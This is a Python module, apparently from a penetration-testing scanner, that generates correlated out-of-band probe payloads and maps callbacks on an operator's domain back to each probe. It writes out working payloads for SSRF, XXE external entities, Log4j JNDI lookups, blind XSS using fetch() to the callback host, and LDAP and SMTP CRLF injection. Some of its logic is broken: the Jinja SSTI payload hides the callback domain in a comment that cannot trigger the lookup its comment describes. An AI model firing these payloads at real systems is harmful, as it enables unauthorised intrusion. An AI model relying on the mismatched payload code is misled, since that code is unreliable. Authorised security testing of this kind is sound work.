"""F115.A — OOB payload generator.

Pure functions. Given an operator-supplied callback domain (e.g. the
subdomain assigned by their self-hosted interactsh server), generate
a set of correlated probe payloads + a way to map observed callbacks
back to which payload triggered them.

Each payload embeds a per-kind, per-call correlation ID in the
subdomain — so when the operator's callback server logs a hit, we
can pinpoint exactly which probe caused it.
"""

from __future__ import annotations

import secrets
from dataclasses import dataclass, field
from typing import Iterable

__all__ = [
    "OobPayload",
    "OOB_PAYLOAD_KINDS",
    "correlation_id",
    "generate_oob_payloads",
    "correlate_payload_with_interactions",
]


OOB_PAYLOAD_KINDS: tuple[str, ...] = (
    "ssrf-http",
    "ssrf-https",
    "ssrf-dns",
    "ssrf-gopher",      # gopher://{domain}/_
    "ssrf-fileproto",   # file:// — separate kind, mostly for log-scanning
    "xxe-system",       # <!ENTITY foo SYSTEM "http://{domain}/xxe">
    "xxe-param",        # parameter entity
    "log4j-jndi",       # ${jndi:ldap://{domain}/...}
    "log4j-jndi-dns",   # ${jndi:dns://{domain}/...}
    "blind-xss-img",    # <img src=x onerror=fetch('https://{domain}/xss')>
    "blind-xss-script", # <script>fetch('https://{domain}/...')</script>
    "blind-xss-svg",    # <svg/onload=fetch('https://{domain}/...')>
    "ssti-jinja",       # {{ "".__class__.__mro__[2].__subclasses__()... }} — DNS-only
    "ldap-injection",   # *)(&(|(uid={domain})))
    "smtp-injection",   # CRLF injection landing on smtp lookup
)


@dataclass(frozen=True)
class OobPayload:
    """One probe payload + the unique correlation ID embedded in it.

    A callback log entry that contains `correlation_id` proves THIS
    payload triggered the OOB interaction."""

    kind: str  # one of OOB_PAYLOAD_KINDS
    correlation_id: str  # the unique subdomain segment
    payload: str  # the string to inject (URL / template / fragment)
    callback_subdomain: str  # the full subdomain that should receive the hit


def correlation_id(prefix: str = "k") -> str:
    """Return a short, URL-safe, unique correlation ID.

    Format: `{prefix}{8 hex chars}` — short enough to fit in a
    subdomain (DNS labels max 63 chars), unique enough across one
    engagement."""
    return f"{prefix}{secrets.token_hex(4)}"


def _payload_for(kind: str, subdomain: str) -> str:
    """Build the actual payload string for a given kind + subdomain."""
    full = subdomain  # full subdomain (e.g. "k1234abcd.callback.example")
    if kind == "ssrf-http":
        return f"http://{full}/"
    if kind == "ssrf-https":
        return f"https://{full}/"
    if kind == "ssrf-dns":
        # Pure DNS — many SSRF fetchers do a DNS lookup BEFORE
        # rejecting the URL, so DNS hits are the most universal
        # signal.
        return full
    if kind == "ssrf-gopher":
        return f"gopher://{full}/_kryon"
    if kind == "ssrf-fileproto":
        return f"file:///{full}"
    if kind == "xxe-system":
        return (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{full}/xxe">]>'
            f'<root>&xxe;</root>'
        )
    if kind == "xxe-param":
        return (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{full}/xxep"> %xxe;]>'
            f'<root>x</root>'
        )
    if kind == "log4j-jndi":
        return f"${{jndi:ldap://{full}/log4j}}"
    if kind == "log4j-jndi-dns":
        return f"${{jndi:dns://{full}/log4jdns}}"
    if kind == "blind-xss-img":
        return f'<img src=x onerror="fetch(\'https://{full}/xssimg\')">'
    if kind == "blind-xss-script":
        return f'<script>fetch("https://{full}/xssjs")</script>'
    if kind == "blind-xss-svg":
        return f'<svg/onload="fetch(\'https://{full}/xsssvg\')">'
    if kind == "ssti-jinja":
        # Many SSTI sandboxes block direct command output but DO
        # honor http requests via os.system(curl ...) when the
        # template environment isn't locked down. We use the
        # DNS-only form to keep the payload small + observable.
        return (
            "{{ ''.__class__.__mro__[1].__subclasses__() }}"
            f"<!-- {full} -->"
        )
    if kind == "ldap-injection":
        return f"*)(uid={full}))"
    if kind == "smtp-injection":
        # CRLF that injects a header pointing the SMTP server at the
        # callback (some SMTP libs honor MX-discovery → DNS hit).
        return f"foo\r\nBcc: probe@{full}\r\n"
    # Unknown kind → return a generic correlation marker
    return full


def generate_oob_payloads(
    callback_domain: str,
    kinds: Iterable[str] = OOB_PAYLOAD_KINDS,
    correlation_id_prefix: str = "k",
) -> tuple[OobPayload, ...]:
    """Build one payload per kind. Each gets a unique correlation ID
    so observed callbacks can be mapped back to the specific probe.

    The `callback_domain` should be the registered domain (e.g. the
    subdomain assigned by interactsh-client). The function prepends
    a per-payload unique subdomain to it."""
    callback_domain = callback_domain.strip().lstrip(".")
    if not callback_domain:
        return ()
    out: list[OobPayload] = []
    for kind in kinds:
        if kind not in OOB_PAYLOAD_KINDS:
            continue
        cid = correlation_id(correlation_id_prefix)
        subdomain = f"{cid}.{callback_domain}"
        out.append(
            OobPayload(
                kind=kind,
                correlation_id=cid,
                payload=_payload_for(kind, subdomain),
                callback_subdomain=subdomain,
            )
        )
    return tuple(out)


def correlate_payload_with_interactions(
    payloads: tuple[OobPayload, ...],
    interaction_subdomains: Iterable[str],
) -> dict[str, list[str]]:
    """Map each payload's `correlation_id` → list of interaction
    subdomains that matched it.

    A payload is considered confirmed if at least one interaction
    subdomain CONTAINS its correlation_id."""
    out: dict[str, list[str]] = {p.correlation_id: [] for p in payloads}
    for sub in interaction_subdomains:
        s = sub.lower()
        for p in payloads:
            if p.correlation_id.lower() in s:
                out[p.correlation_id].append(sub)
    return out
